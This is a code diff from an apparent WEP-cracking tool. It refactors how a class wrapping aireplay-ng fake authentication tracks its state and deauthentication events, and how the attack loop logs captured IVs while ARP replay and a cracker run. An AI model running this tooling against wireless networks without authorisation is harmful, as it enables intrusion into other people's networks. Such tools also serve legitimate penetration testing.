@@ -48,8 +48,8 @@ class FakeAuthentication(object):
         FakeAuthentication process states.
         """
         ok = 0  # Authenticated and associated successfully, sending keep-alive packet.
-        waiting_for_beacon_frame = 1  # 'Waiting for beacon frame'
-        deauthenticated = 2  # Got a deauthentication packet!
+        new = 1  # just started
+        waiting_for_beacon_frame = 2  # 'Waiting for beacon frame'
         terminated = 100
 
     def __init__(self, tmp_dir, interface, ap, attacker_mac):
@@ -59,6 +59,8 @@ class FakeAuthentication(object):
         self.attacker_mac = attacker_mac
 
         self.process = None
+        self.state = None
+        self.flags = {}
         # process' stdout, stderr for its writing
         self.process_stdout_w = None
         self.process_stderr_w = None
@@ -66,11 +68,22 @@ class FakeAuthentication(object):
         self.process_stdout_r = None
         self.process_stderr_r = None
 
+    def __init_flags(self):
+        """
+        Init flags describing state of the running process.
+        Should be called only during start of the process. Flags are set during update_state().
+        """
+        self.flags['deauthenticated'] = False
+        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""
+
     def start(self, reassoc_delay=30, keep_alive_delay=5):
         """
         :param reassoc_delay: reassociation timing in seconds
         :param keep_alive_delay: time between keep-alive packets
         """
+        self.state = FakeAuthentication.State.new
+        self.__init_flags()
+
         cmd = ['aireplay-ng',
                '--fakeauth', str(reassoc_delay),
                '-q', str(keep_alive_delay),
@@ -92,37 +105,29 @@ class FakeAuthentication(object):
                       'stdout @ ' + self.process_stdout_w.name +
                       ', stderr @ ' + self.process_stderr_w.name)
 
-    def check_state(self):
+    def update_state(self):
         """
-        Check state of running process.
-        Read new output from stdout and stderr, check if process is alive and announce state.
-        :return: state of the process
+        Update state of running process from process' feedback.
+        Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
         """
-        state = None
         # check every added line in stdout
         for line in self.process_stdout_r:
-            if state == FakeAuthentication.State.deauthenticated:
-                # If deauthentication was detected, read the rest of added lines. In case of deauthentication, we do not
-                # care about any following successful association.
-                continue
-            elif 'Waiting for beacon frame' in line:
-                state = FakeAuthentication.State.waiting_for_beacon_frame
+            if 'Waiting for beacon frame' in line:
+                self.state = FakeAuthentication.State.waiting_for_beacon_frame
             elif 'Association successful' in line:
-                state = FakeAuthentication.State.ok
+                self.state = FakeAuthentication.State.ok
             elif 'Got a deauthentication packet!' in line:
-                state = FakeAuthentication.State.deauthenticated
-                logging.debug('Got a deauthentication packet!')
-                return state
+                # set flag to notify that at least one deauthentication packet was received since last update
+                self.flags['deauthenticated'] = True
+                logging.debug('FakeAuthentication received a deauthentication packet!')
 
         # check stderr
         # TODO (xvondr20) Does 'aireplay-ng --fakeauth' ever print anything to stderr?
         assert self.process_stderr_r.read() == ''
 
         # is process running?
-        if self.process.poll() is None:
-            state = FakeAuthentication.State.terminated
-
-        return state
+        if self.process.poll() is not None:
+            self.state = FakeAuthentication.State.terminated
 
     def stop(self):
         """
@@ -165,6 +170,10 @@ class FakeAuthentication(object):
 
         self.process_stderr_w.close()
         self.process_stderr_w = None
+
+        # remove state
+        self.state = None
+        self.flags.clear()
 
 
 class ArpReplay(object):
@@ -306,7 +315,6 @@ class WepAttacker(object):
                                                      attacker_mac=self.if_mon_mac)
             fake_authentication.start()
             time.sleep(1)
-            fake_authentication.check_state()  # is fakeauth OK?
 
             arp_replay = ArpReplay(interface=self.if_mon, ap=self.ap)
             arp_replay.start(source_mac=self.if_mon_mac)
@@ -319,15 +327,14 @@ class WepAttacker(object):
                                  dir_network_path=self.dir_network_path)
             cracker.start()
 
-            iv = capturer.get_iv_sum()
-
             while not cracker.has_key():
+                fake_authentication.update_state()
+                logging.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
+                              'flags: ' + str(fake_authentication.flags)
+                              )
+
+                logging.debug('#IV = ' + str(capturer.get_iv_sum()))
                 time.sleep(5)
-                fake_authentication.check_state()  # is fakeauth OK?
-                iv_curr = capturer.get_iv_sum()
-                if iv != iv_curr:
-                    iv = iv_curr
-                    logging.info('#IV = ' + str(iv))
 
             capturer.stop()
             arp_replay.stop()
